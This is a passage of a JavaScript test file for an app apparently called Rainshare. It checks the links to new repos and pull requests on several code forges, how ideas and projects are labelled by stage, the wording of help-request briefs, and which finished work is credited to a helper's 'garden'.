  const places = newRepoPlaces({ title: 'A Seating Chart, shuffled!', about: 'Shuffles a\nclass list' });
  assert.deepEqual(places.map(p => p.forge), ['tangled', 'knotless', 'github', 'codeberg', 'gitlab']);
  assert.equal(places.find(p => p.forge === 'github').href, 'https://github.com/new?name=a-seating-chart-shuffled&description=Shuffles+a+class+list');
  assert.equal(places.find(p => p.forge === 'tangled').href, 'https://tangled.org/repo/new');
  assert.ok(places.every(p => /^https:\/\//.test(p.href)));
  assert.deepEqual(placesFor(parseSubject('https://github.com/o/r/issues/5')), { repo: 'https://github.com/o/r', issue: 'https://github.com/o/r/issues/5', pulls: 'https://github.com/o/r/pulls', fork: 'https://github.com/o/r/fork', newPull: 'https://github.com/o/r/compare', newIssue: 'https://github.com/o/r/issues/new' });
  assert.equal(placesFor(parseSubject('https://tangled.org/a/b/issues/2')).newPull, 'https://tangled.org/a/b/pulls/new');
  assert.equal(placesFor(parseSubject('https://knotless.dev/alice.test/proj')).pulls, 'https://knotless.dev/alice.test/proj/pulls');
  assert.equal(placesFor(parseSubject('https://gitlab.com/a/b')).pulls, 'https://gitlab.com/a/b/-/merge_requests');
  assert.deepEqual(placesFor(parseSubject('https://git.example.org/a/b')), { repo: 'https://git.example.org/a/b' });
  assert.deepEqual(placesFor(undefined), {});
});

test('an idea or a project, said plainly and drawn as how far along it is', () => {
  const repo = parseSubject('https://github.com/o/r');
  // The stage is kept only for a plant: with no repo it's a seed, and needn't say so.
  assert.equal(R.seed({ title: 't', subject: repo, stage: 'seedling' }).stage, 'seedling');
  assert.equal(R.seed({ title: 't', subject: repo, stage: 'seed' }).stage, undefined);
  assert.equal(R.seed({ title: 't', subject: repo, stage: 'ancient' }).stage, undefined);
  assert.equal(R.seed({ title: 't', stage: 'established' }).stage, undefined);
  // People read "idea" or "project"; the stage is the picture (and the record's own word).
  const said = sq => [stageOf(sq), nounOf(sq), aNoun(sq), pictureOf(sq), whatItIs(sq).name];
  assert.deepEqual(said({ title: 't' }), ['seed', 'idea', 'an idea', 'seed', 'Idea']);
  assert.deepEqual(said({ subject: repo, stage: 'seedling' }), ['seedling', 'project', 'a project', 'seedling', 'Project']);
  assert.deepEqual(said({ subject: repo, stage: 'established' }), ['established', 'project', 'a project', 'established', 'Project']);
  assert.deepEqual(said({ subject: repo }), ['young', 'project', 'a project', 'young', 'Project']);          // one that doesn't say is drawn as taking shape
  assert.equal(whatItIs({ subject: repo, stage: 'seedling' }).note, 'Just started: there’s a repo and a first sketch.');
  assert.equal(stateText({ state: 'sprouted' }), 'Done');
  // Once it has sprouted it's drawn one stage on: a seed that sprouted is a seedling now.
  assert.deepEqual([{ state: 'sprouted' }, { subject: repo, stage: 'seedling', state: 'sprouted' }, { subject: repo, stage: 'established', state: 'sprouted' }].map(pictureOf), ['seedling', 'young', 'established']);
  // The brief leads with what it is.
  const item = v => ({ uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: { title: 'Fix it', ...v } });
  assert.match(brief(item({ subject: repo, stage: 'established' })), /^# Project: Fix it\n\nOn Rainshare, people post ideas and projects they want help with, and others send their own agents to do the work\. @friend\.example is asking for help with this project \(established: people use it and rely on it\): https:\/\/[a-z.]+\/seed\/friend\.example\/3k1\./);
  assert.match(brief(item({ owner: 'helper' })), /^# Idea: Fix it\n\n[^\n]*@friend\.example is asking for help with this idea \(nothing’s been built yet\): https/);
  assert.match(brief(item({ subject: repo })), /^# Project: Fix it\n\n[^\n]*is asking for help with this project \(it works, and it’s still taking shape\)/);
});

test('the garden someone has helped grow is what got done with their help, and nothing else', async () => {
  const repo = parseSubject('https://github.com/o/r');
  const dl = (id, by) => ({ uri: `at://${by}/dev.rainshare.delivery/${id}`, cid: 'bafy' + id, repo: by });
  const ask = (rkey, value, deliveries) => ({ uri: `at://did:plc:planter/dev.rainshare.seed/${rkey}`, repo: 'did:plc:planter', rkey, author: { handle: 'p.example' }, value: { title: rkey, createdAt: '2026-11-0' + rkey.slice(-1) + 'T00:00:00Z', ...value }, deliveries });
  const mine = dl('1', 'did:plc:me'), theirs = dl('2', 'did:plc:kai'), ref = d => ({ uri: d.uri, cid: d.cid });
  const items = [
    ask('a1', { state: 'sprouted', sproutedWith: [ref(mine)] }, [mine]),                                   // a seed that sprouted with my work
    ask('a2', { subject: repo, stage: 'young', state: 'sprouted', sproutedWith: [ref(theirs)] }, [mine, theirs]),   // I turned something in, but another's work did it
    ask('a3', { subject: repo, stage: 'seedling' }, [mine]),                                                // turned in, not yet sprouted
    ask('a4', { subject: repo, stage: 'established', state: 'sprouted', sproutedWith: [ref(mine)] }, [mine]),
    ask('a5', { state: 'sprouted', sproutedWith: [{ uri: 'at://did:plc:me/dev.rainshare.delivery/made-up', cid: 'x' }] }, []),   // names a delivery that isn't there
    ask('a6', { state: 'closed', sproutedWith: [ref(mine)] }, [mine])
  ];
  const garden = wateredBy('did:plc:me', items);
  assert.deepEqual(garden.map(g => [g.rkey, g.stage, g.picture]), [['a4', 'established', 'established'], ['a1', 'seed', 'seedling']]);
  assert.equal(wateredText(garden), '1 idea and 1 project');
  assert.deepEqual([wateredText([]), wateredText(wateredBy('did:plc:kai', items))], ['Nothing yet', '1 project']);
  // In the example circle: you start with two, and a friend gains one when you mark their work as what did it.
  const src = createDemoSource({});
  assert.deepEqual((await src.gardenOf(src.viewer)).map(g => g.stage).sort(), ['established', 'seed']);
  assert.equal((await src.gardenOf('did:example:juniper')).length, 0);
  const yours = (await src.board()).items.find(i => i.rkey === '3sq-you'), by = yours.deliveries[0];
  await src.update(yours, { state: 'sprouted', sproutedWith: [{ uri: by.uri, cid: by.cid }] });
  assert.deepEqual((await src.gardenOf('did:example:juniper')).map(g => [g.stage, g.picture]), [['seedling', 'young']]);
});
